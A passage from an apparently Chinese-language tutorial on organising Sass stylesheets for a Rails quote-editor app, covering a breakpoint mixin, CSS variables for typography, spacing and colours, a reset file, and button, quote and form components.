<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当写css时，我们先按照移动端写css，例如：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.my-component</span> <span class="token punctuation">&#123;</span>
  // The CSS for mobile
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>当需要为大尺寸overrides时，使用我们的 media query 可以让事情变得更简单</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.my-component</span> <span class="token punctuation">&#123;</span>
  // The CSS for mobile

  <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    // The CSS for screens bigger than tablets
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这就是 <code>modile first approach</code>，我们先定义小尺寸，再添加override的大尺寸，这是一个使用 mixin 的好的实践，如果后面想增加更多的breakpoints，例如：<code>laptopAndUp or desktopAndUp</code> 就变得很容易了。</p>
<p><code>tabletAndUp</code>比<code>50rem</code>更容易阅读</p>
<p>并且这可以帮我们避免写重复的代码，比如：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.component-1</span> <span class="token punctuation">&#123;</span>
  // The CSS for mobile

  <span class="token atrule"><span class="token rule">@media</span> <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 50rem<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    // The CSS for screens bigger than 50rem
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">.component-2</span> <span class="token punctuation">&#123;</span>
  // The CSS for mobile

  <span class="token atrule"><span class="token rule">@media</span> <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 50rem<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    // The CSS for screens bigger than 50rem
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>想象一下我们要把<code>50rem</code>改为<code>55rem</code>在一些points中，那会是一场维护噩梦。</p>
<p>最后在一个地方有一个精心策划的断点列表可以帮助我们选择最相关的断点，从而限制我们的选择!</p>
<p>这就是我们第一个css文件要说的内容，但很有用，我们的quote编辑器，必须是响应迅速的，并且这是一个简单强大的breakpoints实现</p>
<h3 id="The-configuration-folder"><a href="#The-configuration-folder" class="headerlink" title="The configuration folder"></a>The configuration folder</h3><p>其中一个重要的文件夹是 variables files，去构建一个强壮的设计系统，这里就是我们将选择好看的颜色，可读的字体和保证一直的间距性。</p>
<p>首先：让我们开始设计文本，比如字体，颜色，大小和行高</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/config/_variables.scss

:root</span> <span class="token punctuation">&#123;</span>
  // Simple fonts
  <span class="token property">--font-family-sans</span><span class="token punctuation">:</span> <span class="token string">'Lato'</span><span class="token punctuation">,</span> -apple-system<span class="token punctuation">,</span> BlinkMacSystemFont<span class="token punctuation">,</span> <span class="token string">'Segoe UI'</span><span class="token punctuation">,</span> Roboto<span class="token punctuation">,</span> Oxygen<span class="token punctuation">,</span> Ubuntu<span class="token punctuation">,</span> Cantarell<span class="token punctuation">,</span> <span class="token string">'Open Sans'</span><span class="token punctuation">,</span> <span class="token string">'Helvetica Neue'</span><span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>

  // Classical line heights
  <span class="token property">--line-height-headers</span><span class="token punctuation">:</span> 1.1<span class="token punctuation">;</span>
  <span class="token property">--line-height-body</span><span class="token punctuation">:</span>    1.5<span class="token punctuation">;</span>

  // Classical and robust font sizes system
  <span class="token property">--font-size-xs</span><span class="token punctuation">:</span> 0.75rem<span class="token punctuation">;</span>   // 12px
  <span class="token property">--font-size-s</span><span class="token punctuation">:</span> 0.875rem<span class="token punctuation">;</span>   // 14px
  <span class="token property">--font-size-m</span><span class="token punctuation">:</span> 1rem<span class="token punctuation">;</span>       // 16px
  <span class="token property">--font-size-l</span><span class="token punctuation">:</span> 1.125rem<span class="token punctuation">;</span>   // 18px
  <span class="token property">--font-size-xl</span><span class="token punctuation">:</span> 1.25rem<span class="token punctuation">;</span>   // 20px
  <span class="token property">--font-size-xxl</span><span class="token punctuation">:</span> 1.5rem<span class="token punctuation">;</span>   // 24px
  <span class="token property">--font-size-xxxl</span><span class="token punctuation">:</span> 2rem<span class="token punctuation">;</span>    // 32px
  <span class="token property">--font-size-xxxxl</span><span class="token punctuation">:</span> 2.5rem<span class="token punctuation">;</span> // 40px

  // Three different text colors
  <span class="token property">--color-text-header</span><span class="token punctuation">:</span> <span class="token function">hsl</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 1%<span class="token punctuation">,</span> 16%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-text-body</span><span class="token punctuation">:</span>   <span class="token function">hsl</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 5%<span class="token punctuation">,</span> 25%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-text-muted</span><span class="token punctuation">:</span>  <span class="token function">hsl</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 1%<span class="token punctuation">,</span> 44%<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一个Variables设置帮助我们确认我们的文本设计在整个系统中是一致的。</p>
<p>保持一致的spacing，padding，margins在系统中也是必要的，让我们开始构建简单的标尺。 </p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/config/_variables.scss

:root</span> <span class="token punctuation">&#123;</span>
  // All the previous variables

  // Classical and robust spacing system
  <span class="token property">--space-xxxs</span><span class="token punctuation">:</span> 0.25rem<span class="token punctuation">;</span> // 4px
  <span class="token property">--space-xxs</span><span class="token punctuation">:</span> 0.375rem<span class="token punctuation">;</span> // 6px
  <span class="token property">--space-xs</span><span class="token punctuation">:</span> 0.5rem<span class="token punctuation">;</span>    // 8px
  <span class="token property">--space-s</span><span class="token punctuation">:</span> 0.75rem<span class="token punctuation">;</span>    // 12px
  <span class="token property">--space-m</span><span class="token punctuation">:</span> 1rem<span class="token punctuation">;</span>       // 16px
  <span class="token property">--space-l</span><span class="token punctuation">:</span> 1.5rem<span class="token punctuation">;</span>     // 24px
  <span class="token property">--space-xl</span><span class="token punctuation">:</span> 2rem<span class="token punctuation">;</span>      // 32px
  <span class="token property">--space-xxl</span><span class="token punctuation">:</span> 2.5rem<span class="token punctuation">;</span>   // 40px
  <span class="token property">--space-xxxl</span><span class="token punctuation">:</span> 3rem<span class="token punctuation">;</span>    // 48px
  <span class="token property">--space-xxxxl</span><span class="token punctuation">:</span> 4rem<span class="token punctuation">;</span>   // 64px
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关于颜色：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/config/_variables.scss

:root</span> <span class="token punctuation">&#123;</span>
  // All the previous variables

  // Application colors
  <span class="token property">--color-primary</span><span class="token punctuation">:</span>          <span class="token function">hsl</span><span class="token punctuation">(</span>350<span class="token punctuation">,</span> 67%<span class="token punctuation">,</span> 50%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-primary-rotate</span><span class="token punctuation">:</span>   <span class="token function">hsl</span><span class="token punctuation">(</span>10<span class="token punctuation">,</span> 73%<span class="token punctuation">,</span> 54%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-primary-bg</span><span class="token punctuation">:</span>       <span class="token function">hsl</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 85%<span class="token punctuation">,</span> 96%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-secondary</span><span class="token punctuation">:</span>        <span class="token function">hsl</span><span class="token punctuation">(</span>101<span class="token punctuation">,</span> 45%<span class="token punctuation">,</span> 56%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-secondary-rotate</span><span class="token punctuation">:</span> <span class="token function">hsl</span><span class="token punctuation">(</span>120<span class="token punctuation">,</span> 45%<span class="token punctuation">,</span> 56%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-tertiary</span><span class="token punctuation">:</span>         <span class="token function">hsl</span><span class="token punctuation">(</span>49<span class="token punctuation">,</span> 89%<span class="token punctuation">,</span> 64%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-glint</span><span class="token punctuation">:</span>            <span class="token function">hsl</span><span class="token punctuation">(</span>210<span class="token punctuation">,</span> 100%<span class="token punctuation">,</span> 82%<span class="token punctuation">)</span><span class="token punctuation">;</span>

  // Neutral colors
  <span class="token property">--color-white</span><span class="token punctuation">:</span>      <span class="token function">hsl</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0%<span class="token punctuation">,</span> 100%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-background</span><span class="token punctuation">:</span> <span class="token function">hsl</span><span class="token punctuation">(</span>30<span class="token punctuation">,</span> 50%<span class="token punctuation">,</span> 98%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-light</span><span class="token punctuation">:</span>      <span class="token function">hsl</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 6%<span class="token punctuation">,</span> 93%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--color-dark</span><span class="token punctuation">:</span>       <span class="token function">var</span><span class="token punctuation">(</span>--color-text-header<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The last part of our variables file will contain various user interface styles such as border radiuses and box shadows. Once again, the goal is to ensure consistency in our application.</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/config/_variables.scss

:root</span> <span class="token punctuation">&#123;</span>
  // All the previous variables

  // Border radius
  <span class="token property">--border-radius</span><span class="token punctuation">:</span> 0.375rem<span class="token punctuation">;</span>

  // Border
  <span class="token property">--border</span><span class="token punctuation">:</span> solid 2px <span class="token function">var</span><span class="token punctuation">(</span>--color-light<span class="token punctuation">)</span><span class="token punctuation">;</span>

  // Shadows
  <span class="token property">--shadow-large</span><span class="token punctuation">:</span>  2px 4px 10px <span class="token function">hsl</span><span class="token punctuation">(</span>0 0% 0% / 0.1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">--shadow-small</span><span class="token punctuation">:</span>  1px 3px 6px <span class="token function">hsl</span><span class="token punctuation">(</span>0 0% 0% / 0.1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这就是所有了，我们的系统使用统一的样式。现在 apply those variables to global styles i.e。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/config/_reset.scss

*,
*::before,
*::after</span> <span class="token punctuation">&#123;</span>
  <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">*</span> <span class="token punctuation">&#123;</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">html</span> <span class="token punctuation">&#123;</span>
  <span class="token property">overflow-y</span><span class="token punctuation">:</span> scroll<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">body</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>
  <span class="token property">min-height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>

  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-background<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--line-height-body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-family-sans<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">img,
picture,
svg</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
  <span class="token property">max-width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input,
button,
textarea,
select</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font</span><span class="token punctuation">:</span> inherit<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">h1,
h2,
h3,
h4,
h5,
h6</span> <span class="token punctuation">&#123;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-header<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--line-height-headers<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">h1</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xxxl<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">h2</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xxl<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">h3</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xl<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">h4</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-l<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">a</span> <span class="token punctuation">&#123;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
  <span class="token property">transition</span><span class="token punctuation">:</span> color 200ms<span class="token punctuation">;</span>

  <span class="token selector">&amp;:hover,
  &amp;:focus,
  &amp;:active</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary-rotate<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们可以设计独立的components</p>
<h3 id="The-components-folder"><a href="#The-components-folder" class="headerlink" title="The components folder"></a>The components folder</h3><p>这个文件夹将会包含我们独立的components样式、</p>
<p>Let’s start by, believe it or not, our most complex components: buttons. We will start with the base .btn class and then add four modifiers for the different styles:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_btn.scss

.btn</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxs<span class="token punctuation">)</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">background-origin</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span> // Invisible borders with linear gradients
  <span class="token property">background-color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
  <span class="token property">border</span><span class="token punctuation">:</span> solid 2px transparent<span class="token punctuation">;</span>
  <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
  <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
  <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
  <span class="token property">outline</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
  <span class="token property">transition</span><span class="token punctuation">:</span> filter 400ms<span class="token punctuation">,</span> color 200ms<span class="token punctuation">;</span>

  <span class="token selector">&amp;:hover,
  &amp;:focus,
  &amp;:focus-within,
  &amp;:active</span> <span class="token punctuation">&#123;</span>
    <span class="token property">transition</span><span class="token punctuation">:</span> filter 250ms<span class="token punctuation">,</span> color 200ms<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  // Modifiers will go there
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>btn类是一个内联块元素，我们为其添加了默认样式，如padding, border-radius和transition。注意，在Sass中，&amp;号对应于直接嵌套&amp;号的选择器。在我们的例子中&amp;:hover，将被Sass转换为CSS中的：btn:hover。</p>
<p>现在我们为其添加四个样式：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_btn.scss

.btn</span> <span class="token punctuation">&#123;</span>
  <span class="token selector">// All the previous code

  &amp;--primary</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right<span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary-rotate<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token selector">&amp;:hover,
    &amp;:focus,
    &amp;:focus-within,
    &amp;:active</span> <span class="token punctuation">&#123;</span>
      <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">saturate</span><span class="token punctuation">(</span>1.4<span class="token punctuation">)</span> <span class="token function">brightness</span><span class="token punctuation">(</span>115%<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;--secondary</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right<span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-secondary-rotate<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token selector">&amp;:hover,
    &amp;:focus,
    &amp;:focus-within,
    &amp;:active</span> <span class="token punctuation">&#123;</span>
      <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">saturate</span><span class="token punctuation">(</span>1.2<span class="token punctuation">)</span> <span class="token function">brightness</span><span class="token punctuation">(</span>110%<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;--light</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-dark<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-light<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token selector">&amp;:hover,
    &amp;:focus,
    &amp;:focus-within,
    &amp;:active</span> <span class="token punctuation">&#123;</span>
      <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-dark<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">brightness</span><span class="token punctuation">(</span>92%<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;--dark</span> <span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">border-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-dark<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-dark<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token selector">&amp;:hover,
    &amp;:focus,
    &amp;:focus-within,
    &amp;:active</span> <span class="token punctuation">&#123;</span>
      <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还是上面的规则：<code>&amp;--primary</code> 会被转为：<code>.btn--primary</code>通过Sass预处理器。</p>
<p>我们再写关于<code>.quote</code>component</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_quote.scss

.quote</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">justify-content</span><span class="token punctuation">:</span> space-between<span class="token punctuation">;</span>
  <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
  <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-s<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--shadow-small<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__actions</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 0 0 auto<span class="token punctuation">;</span>
    <span class="token property">align-self</span><span class="token punctuation">:</span> flex-start<span class="token punctuation">;</span>
    <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下来是<code>.form 和 .visually-hidden</code>，之前我们使用了<code>simple form</code>,其中定义了：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">config<span class="token punctuation">.</span>wrappers <span class="token symbol">:default</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form__group"</span></span> <span class="token keyword">do</span> <span class="token operator">|</span>b<span class="token operator">|</span>
  b<span class="token punctuation">.</span>use <span class="token symbol">:html5</span>
  b<span class="token punctuation">.</span>use <span class="token symbol">:placeholder</span>
  b<span class="token punctuation">.</span>use <span class="token symbol">:label</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"visually-hidden"</span></span>
  b<span class="token punctuation">.</span>use <span class="token symbol">:input</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form__input"</span></span><span class="token punctuation">,</span> <span class="token symbol">error_class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form__input--invalid"</span></span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们开始定义<code>.form</code></p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_form.scss

.form</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">flex-wrap</span><span class="token punctuation">:</span> wrap<span class="token punctuation">;</span>
